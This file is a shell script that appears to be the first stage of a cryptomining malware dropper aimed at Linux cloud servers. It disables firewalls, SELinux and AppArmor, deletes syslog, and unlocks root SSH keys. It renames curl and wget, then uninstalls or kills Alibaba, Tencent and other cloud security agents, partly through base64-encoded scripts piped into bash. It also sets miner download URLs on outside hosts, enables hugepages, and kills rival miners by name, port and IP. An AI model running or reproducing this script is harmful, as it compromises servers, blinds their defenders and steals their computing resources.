#!/bin/sh
ulimit -n 65535
chmod 777 /usr/bin/chattr /bin/chattr
chattr -iua /tmp/ /var/tmp/
iptables -F
ufw disable
echo '0' > /proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >> /etc/sysctl.conf
chattr -iae /root/.ssh /root/.ssh/authorized_keys
rm -rf /tmp/addres* /tmp/walle* /tmp/keys
rm -f /var/log/syslog
setenforce 0 2>/dev/null
echo "SELINUX=disabled" > /etc/sysconfig/selinux 2>/dev/null
sync && echo 3 > /proc/sys/vm/drop_caches

crondir='/var/spool/cron/'"$USER"
cont=`cat ${crondir}`
ssht=`cat /root/.ssh/authorized_keys`
echo 1 > /etc/httpgds
rtdir="/etc/httpgds"
bbdir="/usr/bin/curl"
bbdira="/usr/bin/cd1"
ccdir="/usr/bin/wget"
ccdira="/usr/bin/wd1"

mv /usr/bin/wgettnt /usr/bin/wd1
mv /usr/bin/curltnt /usr/bin/cd1
mv /usr/bin/wget1 /usr/bin/wd1
mv /usr/bin/curl1 /usr/bin/cd1
mv /usr/bin/cur /usr/bin/cd1
mv /usr/bin/cdl /usr/bin/cd1
mv /usr/bin/cdt /usr/bin/cd1
mv /usr/bin/xget /usr/bin/wd1
mv /usr/bin/wge /usr/bin/wd1
mv /usr/bin/wdl /usr/bin/wd1
mv /usr/bin/wdt /usr/bin/wd1
mv /usr/bin/wget /usr/bin/wd1
mv /usr/bin/curl /usr/bin/cd1

if ps aux | grep -i '[a]liyun'; then
  $bbdir http://update.aegis.aliyun.com/download/uninstall.sh | bash
  $bbdir http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  $bbdira http://update.aegis.aliyun.com/download/uninstall.sh | bash
  $bbdira http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  echo 'IyEvYmluL2Jhc2gKCkFFR0lTX0lOU1RBTExfRElSPSIvdXNyL2xvY2FsL2FlZ2lzIgojY2hlY2sgbGludXggR2VudG9vIG9zIAp2YXI9YGxzYl9yZWxlYXNlIC1hIHwgZ3JlcCBHZW50b29gCmlmIFsgLXogIiR7dmFyfSIgXTsgdGhlbiAKCXZhcj1gY2F0IC9ldGMvaXNzdWUgfCBncmVwIEdlbnRvb2AKZmkKY2hlY2tDb3Jlb3M9YGNhdCAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwgfCBncmVwIGNvcmVvc2AKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbGlmIFsgLWYgIi9ldGMvb3MtcmVsZWFzZSIgLWEgLW4gIiR7Y2hlY2tDb3Jlb3N9IiBdOyB0aGVuCglMSU5VWF9SRUxFQVNFPSJDT1JFT1MiCglBRUdJU19JTlNUQUxMX0RJUj0iL29wdC9hZWdpcyIKZWxzZSAKCUxJTlVYX1JFTEVBU0U9Ik9USEVSIgpmaQkJCgpzdG9wX2FlZ2lzX3BraWxsKCl7CiAgICBwa2lsbCAtOSBBbGlZdW5EdW4gPi9kZXYvbnVsbCAyPiYxCiAgICBwa2lsbCAtOSBBbGlIaWRzID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpSGlwcyA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaU5ldCA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaVNlY0d1YXJkID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpWXVuRHVuVXBkYXRlID4vZGV2L251bGwgMj4mMQogICAgCiAgICAvdXNyL2xvY2FsL2FlZ2lzL0FsaU5ldC9BbGlOZXQgLS1zdG9wZHJpdmVyCiAgICAvdXNyL2xvY2FsL2FlZ2lzL2FsaWhpcHMvQWxpSGlwcyAtLXN0b3Bkcml2ZXIKICAgIC91c3IvbG9jYWwvYWVnaXMvQWxpU2VjR3VhcmQvQWxpU2VjR3VhcmQgLS1zdG9wZHJpdmVyCiAgICBwcmludGYgIiUtNDBzICU0MHNcbiIgIlN0b3BwaW5nIGFlZ2lzIiAiWyAgT0sgIF0iCn0KCiMgY2FuIG5vdCByZW1vdmUgYWxsIGFlZ2lzIGZvbGRlciwgYmVjYXVzZSB0aGVyZSBpcyBiYWNrdXAgZmlsZSBpbiBnbG9iYWxjZmcKcmVtb3ZlX2FlZ2lzKCl7Cmtwcm9iZUFycj0oCiAgICAiL3N5cy9rZXJuZWwvZGVidWcvdHJhY2luZy9pbnN0YW5jZXMvYWVnaXNfZG9fc3lzX29wZW4vc2V0X2V2ZW50IgogICAgIi9zeXMva2VybmVsL2RlYnVnL3RyYWNpbmcvaW5zdGFuY2VzL2FlZ2lzX2luZXRfY3NrX2FjY2VwdC9zZXRfZXZlbnQiCiAgICAiL3N5cy9rZXJuZWwvZGVidWcvdHJhY2luZy9pbnN0YW5jZXMvYWVnaXNfdGNwX2Nvbm5lY3Qvc2V0X2V2ZW50IgogICAgIi9zeXMva2VybmVsL2RlYnVnL3RyYWNpbmcvaW5zdGFuY2VzL2FlZ2lzL3NldF9ldmVudCIKICAgICIvc3lzL2tlcm5lbC9kZWJ1Zy90cmFjaW5nL2luc3RhbmNlcy9hZWdpc18vc2V0X2V2ZW50IgogICAgIi9zeXMva2VybmVsL2RlYnVnL3RyYWNpbmcvaW5zdGFuY2VzL2FlZ2lzX2FjY2VwdC9zZXRfZXZlbnQiCiAgICAiL3N5cy9rZXJuZWwvZGVidWcvdHJhY2luZy9rcHJvYmVfZXZlbnRzIgogICAgIi91c3IvbG9jYWwvYWVnaXMvYWVnaXNfZGVidWcvdHJhY2luZy9zZXRfZXZlbnQiCiAgICAiL3Vzci9sb2NhbC9hZWdpcy9hZWdpc19kZWJ1Zy90cmFjaW5nL2twcm9iZV9ldmVudHMiCikKZm9yIHZhbHVlIGluICR7a3Byb2JlQXJyW0BdfQpkbwogICAgaWYgWyAtZiAiJHZhbHVlIiBdOyB0aGVuCiAgICAgICAgZWNobyA+ICR2YWx1ZQogICAgZmkKZG9uZQppZiBbIC1kICIke0FFR0lTX0lOU1RBTExfRElSfSIgXTt0aGVuCiAgICB1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vYWVnaXNfZGVidWcKICAgIGlmIFsgLWQgIiR7QUVHSVNfSU5TVEFMTF9ESVJ9L2Nncm91cC9jcHUiIF07dGhlbgogICAgICAgIHVtb3VudCAke0FFR0lTX0lOU1RBTExfRElSfS9jZ3JvdXAvY3B1CiAgICBmaQogICAgaWYgWyAtZCAiJHtBRUdJU19JTlNUQUxMX0RJUn0vY2dyb3VwIiBdO3RoZW4KICAgICAgICB1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vY2dyb3VwCiAgICBmaQogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX2NsaWVudAogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX3VwZGF0ZQoJcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FsaWhpZHMKICAgIHJtIC1yZiAke0FFR0lTX0lOU1RBTExfRElSfS9nbG9iYWxjZmcvZG9tYWluY2ZnLmluaQpmaQp9Cgp1bmluc3RhbGxfc2VydmljZSgpIHsKICAgCiAgIGlmIFsgLWYgIi9ldGMvaW5pdC5kL2FlZ2lzIiBdOyB0aGVuCgkJL2V0Yy9pbml0LmQvYWVnaXMgc3RvcCAgPi9kZXYvbnVsbCAyPiYxCgkJcm0gLWYgL2V0Yy9pbml0LmQvYWVnaXMgCiAgIGZpCgoJaWYgWyAkTElOVVhfUkVMRUFTRSA9ICJHRU5UT08iIF07IHRoZW4KCQlyYy11cGRhdGUgZGVsIGFlZ2lzIGRlZmF1bHQgMj4vZGV2L251bGwKCQlpZiBbIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiBdOyB0aGVuCgkJCXJtIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiA+L2Rldi9udWxsIDI+JjE7CgkJZmkKICAgIGVsaWYgWyAtZiAvZXRjL2luaXQuZC9hZWdpcyBdOyB0aGVuCiAgICAgICAgIC9ldGMvaW5pdC5kL2FlZ2lzICB1bmluc3RhbGwKCSAgICBmb3IgKCh2YXI9MjsgdmFyPD01OyB2YXIrKykpIGRvCgkJCWlmIFsgLWQgIi9ldGMvcmMke3Zhcn0uZC8iIF07dGhlbgoJCQkJIHJtIC1mICIvZXRjL3JjJHt2YXJ9LmQvUzgwYWVnaXMiCgkJICAgIGVsaWYgWyAtZCAiL2V0Yy9yYy5kL3JjJHt2YXJ9LmQiIF07dGhlbgoJCQkJcm0gLWYgIi9ldGMvcmMuZC9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCQlmaQoJCWRvbmUKICAgIGZpCgp9CgpzdG9wX2FlZ2lzX3BraWxsCnVuaW5zdGFsbF9zZXJ2aWNlCnJlbW92ZV9hZWdpcwp1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vYWVnaXNfZGVidWcKCgpwcmludGYgIiUtNDBzICU0MHNcbiIgIlVuaW5zdGFsbGluZyBhZWdpcyIgICJbICBPSyAgXSIKCgoK' | base64 -d | bash
  echo 'IyEvYmluL2Jhc2gKCiNjaGVjayBsaW51eCBHZW50b28gb3MgCnZhcj1gbHNiX3JlbGVhc2UgLWEgfCBncmVwIEdlbnRvb2AKaWYgWyAteiAiJHt2YXJ9IiBdOyB0aGVuIAoJdmFyPWBjYXQgL2V0Yy9pc3N1ZSB8IGdyZXAgR2VudG9vYApmaQoKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbHNlCglMSU5VWF9SRUxFQVNFPSJPVEhFUiIKZmkKCnN0b3BfYWVnaXMoKXsKCWtpbGxhbGwgLTkgYWVnaXNfY2xpID4vZGV2L251bGwgMj4mMQoJa2lsbGFsbCAtOSBhZWdpc191cGRhdGUgPi9kZXYvbnVsbCAyPiYxCglraWxsYWxsIC05IGFlZ2lzX2NsaSA+L2Rldi9udWxsIDI+JjEKICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgYWVnaXMiICJbICBPSyAgXSIKfQoKc3RvcF9xdWFydHooKXsKCWtpbGxhbGwgLTkgYWVnaXNfcXVhcnR6ID4vZGV2L251bGwgMj4mMQogICAgICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgcXVhcnR6IiAiWyAgT0sgIF0iCn0KCnJlbW92ZV9hZWdpcygpewppZiBbIC1kIC91c3IvbG9jYWwvYWVnaXMgXTt0aGVuCiAgICBybSAtcmYgL3Vzci9sb2NhbC9hZWdpcy9hZWdpc19jbGllbnQKICAgIHJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3VwZGF0ZQpmaQp9CgpyZW1vdmVfcXVhcnR6KCl7CmlmIFsgLWQgL3Vzci9sb2NhbC9hZWdpcyBdO3RoZW4KCXJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3F1YXJ0egpmaQp9CgoKdW5pbnN0YWxsX3NlcnZpY2UoKSB7CiAgIAogICBpZiBbIC1mICIvZXRjL2luaXQuZC9hZWdpcyIgXTsgdGhlbgoJCS9ldGMvaW5pdC5kL2FlZ2lzIHN0b3AgID4vZGV2L251bGwgMj4mMQoJCXJtIC1mIC9ldGMvaW5pdC5kL2FlZ2lzIAogICBmaQoKCWlmIFsgJExJTlVYX1JFTEVBU0UgPSAiR0VOVE9PIiBdOyB0aGVuCgkJcmMtdXBkYXRlIGRlbCBhZWdpcyBkZWZhdWx0IDI+L2Rldi9udWxsCgkJaWYgWyAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgXTsgdGhlbgoJCQlybSAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgPi9kZXYvbnVsbCAyPiYxOwoJCWZpCiAgICBlbGlmIFsgLWYgL2V0Yy9pbml0LmQvYWVnaXMgXTsgdGhlbgogICAgICAgICAvZXRjL2luaXQuZC9hZWdpcyAgdW5pbnN0YWxsCgkgICAgZm9yICgodmFyPTI7IHZhcjw9NTsgdmFyKyspKSBkbwoJCQlpZiBbIC1kICIvZXRjL3JjJHt2YXJ9LmQvIiBdO3RoZW4KCQkJCSBybSAtZiAiL2V0Yy9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCSAgICBlbGlmIFsgLWQgIi9ldGMvcmMuZC9yYyR7dmFyfS5kIiBdO3RoZW4KCQkJCXJtIC1mICIvZXRjL3JjLmQvcmMke3Zhcn0uZC9TODBhZWdpcyIKCQkJZmkKCQlkb25lCiAgICBmaQoKfQoKc3RvcF9hZWdpcwpzdG9wX3F1YXJ0egp1bmluc3RhbGxfc2VydmljZQpyZW1vdmVfYWVnaXMKcmVtb3ZlX3F1YXJ0egoKcHJpbnRmICIlLTQwcyAlNDBzXG4iICJVbmluc3RhbGxpbmcgYWVnaXNfcXVhcnR6IiAgIlsgIE9LICBdIgoKCgo=' | base64 -d | bash
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi


if [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then
  /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop && /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove && rm -rf /usr/local/cloudmonitor  
else
  export ARCH=amd64
  if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} ]; then
    /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} stop && /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} uninstall && rm -rf /usr/local/cloudmonitor 
  else
    echo "ali cloud monitor not running"
  fi
fi


setenforce 0
echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aegis' | awk '{print $11}' | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep 'hids' | awk '{print $11}' | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep 'cloudwalker' | awk '{print $11}' | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep 'titanagent' | awk '{print $11}' | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep 'edr' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'hids' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'cloudwalker' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'titanagent' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'sgagent' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'barad_agent' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'hostguard' | awk '{print $2}' | xargs  -I {}  kill -9 {}

rm -rf /usr/local/aegis

sh_url="http://natalstatus.org/ep9TS2/nnt.sh"
miner_url="http://natalstatus.org/ep9TS2/httpgd"
miner_size="2654112"
sh_url_backup="http://103.79.77.16/ep9TS2/nnt.sh"
miner_url_backup="http://103.79.77.16/ep9TS2/httpgd"
chattr_size="8000"

sleep 1

if [ -x "$(command -v t)" ]; then
mv /usr/bin/t /usr/bin/chattr
fi

if [ -x "$(command -v chattr)" ]; then
chattr -i /usr/bin/ip6network
chattr -i /usr/bin/kswaped
chattr -i /usr/bin/irqbalanced
chattr -i /usr/bin/rctlcli
chattr -i /usr/bin/systemd-network
chattr -i /usr/bin/pamdicks
echo 1 > /usr/bin/ip6network
echo 2 > /usr/bin/kswaped
echo 3 > /usr/bin/irqbalanced
echo 4 > /usr/bin/rctlcli
echo 5 > /usr/bin/systemd-network
echo 6 > /usr/bin/pamdicks
chattr +i /usr/bin/ip6network
chattr +i /usr/bin/kswaped
chattr +i /usr/bin/irqbalanced
chattr +i /usr/bin/rctlcli
chattr +i /usr/bin/systemd-network
chattr +i /usr/bin/pamdicks
fi
sleep 1

rm -f /tmp/.null 2>/dev/null
echo 128 > /proc/sys/vm/nr_hugepages
sysctl -w vm.nr_hugepages=128

kill_miner_proc()
{
netstat -anp | grep :23 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3389 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6665 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :8444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :10008 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
ps.original aux | grep -v grep | grep ':13531' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '45.76.122.92' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.15.56.161' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "C4iLM4L" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "i4b503a52cc5" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "2g0uv7npuhrlatd" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "nqscheduler" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "]" | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "\[^" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | egrep 'wnTKYg|2t3ik|qW3xT.2|ddg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '104.248.4.162' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '89.35.39.78' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'redis2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "x]" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "sh] <" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep " \[]" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'CnzFVPLF' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'CvKzzZLs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '2mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '2mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'cr5.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'cr5.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '107.174.47.156' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '83.220.169.247' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.38.203.146' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '144.217.45.45' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '107.174.47.181' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '176.31.6.16' | awk '{print $2}' | xargs -I % kill -9 %
netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
pgrep -f 'L2Jpbi9iYXN|xzpauectgr|slxfbkmxtd|mixtape|addnj|200.68.17.196|mwyumwdbpq.conf|honvbsasbf.conf|mqdsflm.cf|lower.sh|./ppp|cryptonight|./seervceaess|./servceaess|./servceas|./servcesa|./vsp|./jvs|./pvv|./vpp|./pces|./rspce|./haveged|./jiba|./watchbog|kacpi_svc|kswap_svc|kauditd_svc|kpsmoused_svc|kseriod_svc|kthreadd_svc|ksoftirqd_svc|kintegrityd_svc|jawa|oracle.jpg|188.209.49.54|181.214.87.241|servim|kblockd_svc|native_svc|ynn|65ccEJ7|jmxx|2Ne80nA|sysstats|systemxlv|watchbog|OIcJi1m' | xargs -r kill -9
pkill -f -e 'biosetjenkins|Loopback|apaceha|cryptonight|mixnerdx|performedl|conns|irqbalance|crypto-pool|XJnRj|mgwsl|pythno|jweri|lx26|NXLAi|BI5zj|askdljlqw|minergate|Guard.sh|ysaydh|bonns|donns|kxjd|Duck.sh|bonn.sh|conn.sh|kworker34|kw.sh|pro.sh|acpid|icb5o|nopxi|irqbalanc1|minerd|i586|gddr|mstxmr|ddg.2011|wnTKYg|deamon|disk_genius|sourplum|polkitd|nanoWatch|zigw|devtool|devtools|watchbog|sustes|xmrig|xmrig-cpu|121.42.151.137|init12.cfg|nginxk|tmp/wc.confz|xmrig-notls|xmr-stak|suppoie|zer0day.ru|dbus-daemon--system|nullcrew|systemctI|kworkerds|init10.cfg|/wl.conf|crond64|sustse|vmlinuz|exin|apachiii|crypto|tntrecht|xr|svcupdate'
pkill -9 -f 'cnrig'
